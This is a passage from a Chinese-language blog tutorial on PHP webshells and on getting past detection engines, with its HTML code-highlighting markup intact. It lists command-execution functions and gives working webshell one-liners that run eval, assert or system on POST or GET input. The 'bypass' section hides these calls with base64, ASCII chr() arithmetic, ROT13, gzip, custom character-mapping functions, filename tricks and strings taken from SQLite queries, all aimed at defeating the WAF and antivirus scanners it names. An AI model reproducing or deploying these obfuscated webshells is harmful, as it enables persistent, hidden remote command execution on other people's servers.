)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><p>pack()<br>函数把数据装入一个二进制字符串<br>简单来说，就是将指定编码的数字转成字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C3&quot;</span>,<span class="number">80</span>,<span class="number">72</span>,<span class="number">80</span>);   <span class="comment">//ASCII编码转换为PHP</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H*&quot;</span>,<span class="number">4161627973735465616</span>d);    <span class="comment">//16进制编码转换为AabyssTeam</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">其他参数请参考菜鸟教程： https:<span class="comment">//www.runoob.com/php/func-misc-pack.html</span></span><br><span class="line"><span class="comment">### 命令执行函数</span></span><br><span class="line"><span class="number">1</span>. <span class="keyword">eval</span>()  </span><br><span class="line">函数把字符串按照 PHP 代码来计算，即执行PHP代码</span><br><span class="line">```php</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;111&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>system()<br>函数的主要功能是在系统权限允许的情况下，执行系统命令（Windows系统和Linux系统均可执行）</p></li><li><p>exec()<br>函数可以执行系统命令，但它不会直接输出结果，而是将执行的结果保存到数组中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>( <span class="string">&#x27;ls&#x27;</span> , <span class="variable">$result</span> );</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>);        <span class="comment">//Array ( [0] =&gt; index.php )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>shell_exec()<br>函数可以执行系统命令，但不会直接输出执行的结果，而是返回一个字符串类型的变量来存储系统命令的执行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>);    <span class="comment">//index.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>passthru()<br> 函数可以执行系统命令并将执行结果输出到页面中<br> 与 system() 函数不同的是，它支持二进制的数据，使用时直接在参数中传递字符串类型的系统命令即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;ls&#x27;</span>);    <span class="comment">//index.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>popen()<br>popen() 函数可以执行系统命令,但不会输出执行的结果，而是返回一个资源类型的变量用来存储系统命令的执行结果<br>故需要配合 fread() 函数来读取命令的执行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);    <span class="comment">//参数1:执行ls命令 参数2:字符串类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$result</span>, <span class="number">100</span>);      <span class="comment">//参数1:上面生成的资源 参数2:读取100个字节</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>反引号&#96;&#96;<br>反引号可以执行系统命令但不会输出结果，而是返回一个字符串类型的变量用来存储系统命令的执行结果可单独使用，也可配合其他命令执行函数使用来绕过参数中的滤条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `ls`;    <span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;<span class="comment">//短webshell</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="文件写入类函数"><a href="#文件写入类函数" class="headerlink" title="文件写入类函数"></a>文件写入类函数</h3><ol><li>fwrite()<br>函数是用于写入文件，如果成功执行，则返回写入的字节数；失败，则返回 FALSE<br>例子：将 Hello World. Testing! 写入 test.txt<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="string">&quot;Hello World. Testing!&quot;</span>);    <span class="comment">//21</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>file_put_contents()<br>函数把一个字符串写入文件中</li></ol><p>如果文件不存在，将创建一个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;sites.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$site</span> = <span class="string">&quot;\nGoogle&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$site</span>, FILE_APPEND);<span class="comment">//使用 FILE_APPEND 标记，可以在文件末尾追加内容</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">同时该函数可以配合解密函数写入文件，比如：</span><br><span class="line">```php</span><br><span class="line"><span class="variable">$datatest</span> = <span class="string">&quot;[文件的base64编码]&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./要写入的文件名&#x27;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$datatest</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="异常处理类函数"><a href="#异常处理类函数" class="headerlink" title="异常处理类函数"></a>异常处理类函数</h3><ol><li>Exception 类<br>是php所有异常的基类，这个类包含如下方法：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__construct  <span class="comment">//异常构造函数</span></span><br><span class="line">getMessage   <span class="comment">//获取异常消息内容</span></span><br><span class="line">getPrevious  <span class="comment">//返回异常链中的前一个异常，如果不存在则返回null值</span></span><br><span class="line">getCode      <span class="comment">//获取异常代码</span></span><br><span class="line">getFile      <span class="comment">//获取发生异常的程序文件名称</span></span><br><span class="line">getLine      <span class="comment">//获取发生异常的代码在文件中的行号</span></span><br><span class="line">getTrace     <span class="comment">//获取异常追踪信息，其返回值是一个数组</span></span><br><span class="line">getTraceAsString <span class="comment">//获取字符串类型的异常追踪信息</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 创建一个有异常处理的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span>(<span class="params"><span class="variable">$number</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$number</span>&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;变量值必须小于等于 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在 try 块 触发异常</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">checkNum</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 如果抛出异常，以下文本不会输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;如果输出该内容，说明 $number 变量&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 捕获异常</span></span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span> ; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误信息：&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错误码：&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getCode</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错误文件：&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getFile</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错误行数：&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getLine</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;前一个异常：&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getPrevious</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异常追踪信息：&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getTrace</span>(), <span class="literal">true</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;报错内容输出完毕&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*Message: 变量值必须小于等于 1</span></span><br><span class="line"><span class="comment">错误信息：变量值必须小于等于 1</span></span><br><span class="line"><span class="comment">错误码：0</span></span><br><span class="line"><span class="comment">错误文件：D:\phpstudy_pro\WWW\AabyssZG\error.php</span></span><br><span class="line"><span class="comment">错误行数：7</span></span><br><span class="line"><span class="comment">前一个异常：</span></span><br><span class="line"><span class="comment">异常追踪信息：Array ( [0] =&gt; Array ( [file] =&gt; D:\phpstudy_pro\WWW\AabyssZG\error.php [line] =&gt; 14 [function] =&gt; checkNum [args] =&gt; Array ( [0] =&gt; 2 ) ) )</span></span><br><span class="line"><span class="comment">报错内容输出完毕</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></li></ol><h3 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h3><ol><li>Sqlite数据库<br>配合我上面写的 file_put_contents() 文件写入函数，先写入本地Sqlite文件然后读取敏感内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="string">&quot;111ZG.db&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;sqlite:&quot;</span> . <span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//连接数据库后查询敏感关键词</span></span><br><span class="line"><span class="variable">$sql_stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;select * from test where name=&quot;system&quot;&#x27;</span>);</span><br><span class="line"><span class="variable">$sql_stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment">//提权敏感关键词并进行拼接</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$sql_stmt</span>-&gt;queryString, -<span class="number">7</span>, <span class="number">6</span>);</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;111&#x27;</span>]);       <span class="comment">//system($_GET[&#x27;111&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>MySQL数据库<br>这里使用 MySQLi() 这个函数，其实PHP有很多MySQL连接函数，可自行尝试<br>然后通过这个函数，连接公网数据库（只要目标能出网），即可连接并获得敏感字符拼接到php中<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">coon</span>(<span class="params"><span class="variable">$sql</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title class_">MySQLi</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test123&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//默认的 MySQL的类，其属性与方法见手册</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span> - &gt; connect_error) &#123;</span><br><span class="line">        <span class="comment">//connect_error为属性，报错</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;数据库连接失败：&quot;</span>.<span class="variable">$mysqli</span> - &gt; connect_errno. <span class="string">&quot;--&quot;</span>.<span class="variable">$mysqli</span> - &gt; connect_error);</span><br><span class="line">        <span class="comment">// connect_errno:错误编号</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span> - &gt; <span class="title function_ invoke__">select_db</span>(<span class="string">&quot;test&quot;</span>); <span class="comment">//选择数据库</span></span><br><span class="line">    <span class="comment">// 返回值 $res 为资源类型（获取到结果的资源类型）</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span> - &gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="variable">$mysqli</span> - &gt; error);</span><br><span class="line">    <span class="comment">//释放结果集，关闭连接</span></span><br><span class="line">    <span class="variable">$mysqli</span> - &gt; <span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from test where name LIKE &#x27;system&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">coon</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">array</span>(<span class="string">&quot;data&quot;</span> =&gt; <span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="php过滤器"><a href="#php过滤器" class="headerlink" title="php过滤器"></a>php过滤器</h3><p><img src="/images/webshell1.png" alt="webshell1"></p><h2 id="免杀测试"><a href="#免杀测试" class="headerlink" title="免杀测试"></a>免杀测试</h2><p>牧云Webshell检测引擎：<br>微步在线云沙箱：<br>河马WebShell在线查杀：<br>百度WEBDIR+在线查杀<br>大名鼎鼎的VirusTotal：  </p><pre><code>渊龙Sec团队导航（上面啥都有）： https://dh.aabyss.cn/长亭牧云查杀： https://stack.chaitin.com/security-challenge/webshell/index阿里云恶意文件检测平台：https://ti.aliyun.com/#/webshell阿里伏魔引擎： https://xz.aliyun.com/zuesVirusTotal： https://www.virustotal.com/gui/home/upload微步在线云沙箱： https://s.threatbook.com/河马WebShell查杀： https://n.shellpub.com/百度WEBDIR+： https://scanner.baidu.com/D盾： http://www.d99net.net/网站安全狗： http://free.safedog.cn/website_safedog.html</code></pre><blockquote><p>免杀思路  </p></blockquote><pre><code>1 分析统计内容（传统）：可以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。2 语义分析（AST）：把代码转换成AST语法树，之后可以对一些函数进行调试追踪，那些混淆或者变形过的webshell基本都能被检测到。但是对于PHP这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。3 机器学习（AI）：这种方法需要大量的样本数据，通过一些AI自动学习模型，总结归类Webshell的特征库，最终去检测Webshell。4 动态监控（沙箱）：采用RASP方式，一旦检测到有对应脚本运行，就去监控（Hook）里边一些危险函数，一但存在调用过程将会立刻阻止。这种阻止效果是实时的，这种方法应该是效果最好的，但是成本十分高昂。</code></pre><h2 id="最激动人心的部分，bypass"><a href="#最激动人心的部分，bypass" class="headerlink" title="最激动人心的部分，bypass"></a>最激动人心的部分，bypass</h2><h3 id="编码绕过（推荐嵌套）"><a href="#编码绕过（推荐嵌套）" class="headerlink" title="编码绕过（推荐嵌套）"></a>编码绕过（推荐嵌套）</h3><ol><li><p>base64</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;YX____Nz__ZX__J0&quot;</span>);  <span class="comment">//解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[aabyss]);                      <span class="comment">//assert($_POST[aabyss]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>ASCII码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span> =  <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);                <span class="comment">//assert($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><!-- <img src="https://xxcc197.github.io/blog/images/ascll.png" alert="ascll"> --><p><img src="/images/ascll.png" alt="ascll"></p></li><li><p>ROT13编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;flfgrz&#x27;</span>);  <span class="comment">//解密后为system高危函数</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);      <span class="comment">//system($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Gzip压缩加密</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Protected by AabyssZG*/</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;40pNzshXKMgoyMxLy9fQtFawtwMA&#x27;</span>))); </span><br><span class="line"><span class="comment">//phpinfo()</span></span><br><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;getEncryption&#x27;</span>)) &#123;</span><br><span class="line">　　<span class="comment">/**</span></span><br><span class="line"><span class="comment">　　 * 基于base64的数据加密</span></span><br><span class="line"><span class="comment">　　 * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">　　 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">　　 */</span></span><br><span class="line">　　<span class="function"><span class="keyword">function</span> <span class="title">getEncryption</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>)));</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;unEncryption&#x27;</span>)) &#123;</span><br><span class="line">　　<span class="comment">/**</span></span><br><span class="line"><span class="comment">　　 * 解密</span></span><br><span class="line"><span class="comment">　　 * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">　　 * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">　　 */</span></span><br><span class="line">　  <span class="function"><span class="keyword">function</span> <span class="title">unEncryption</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"> 　　　　<span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)));</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/zhanzy/p/14361877.html" target="_blank">详细加密过程在这里</a></p><h3 id="字符串混淆处理绕过"><a href="#字符串混淆处理绕过" class="headerlink" title="字符串混淆处理绕过"></a>字符串混淆处理绕过</h3><ol><li><p>自定义函数混淆字符串<br>通过对上面所说两部分敏感内容的拼接、混淆以及变换，来绕过WAF的检测逻辑，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">confusion</span>(<span class="number">976534</span>);         <span class="comment">//sysTem（高危函数）</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);           <span class="comment">//sysTem($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>自定义函数+文件名混淆<br>同，可以配合文件名玩出一些花活，我们建一个PHP名字为 976534.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;/&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">confusion</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="keyword">__FILE__</span>, -<span class="number">10</span>, <span class="number">6</span>)));   <span class="comment">//sysTem（高危函数）</span></span><br><span class="line"><span class="comment">//__FILE__为976534.php</span></span><br><span class="line"><span class="comment">//substr(__FILE__, -10, 6)即从文件名中提取出976534</span></span><br><span class="line"><span class="comment">//confusion(intval(976534))即输出了sysTem（高危函数），拼接即可</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);        <span class="comment">//sysTem($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">首先先读取文件名，从 <span class="number">976534</span>.php 文件名中提取出 <span class="number">976534</span> ，然后带入函数中就成功返还 sysTem 高危函数了，可以配合其他姿势一起使用，达成免杀效果</span><br><span class="line"><span class="number">3</span>.   特殊字符串</span><br><span 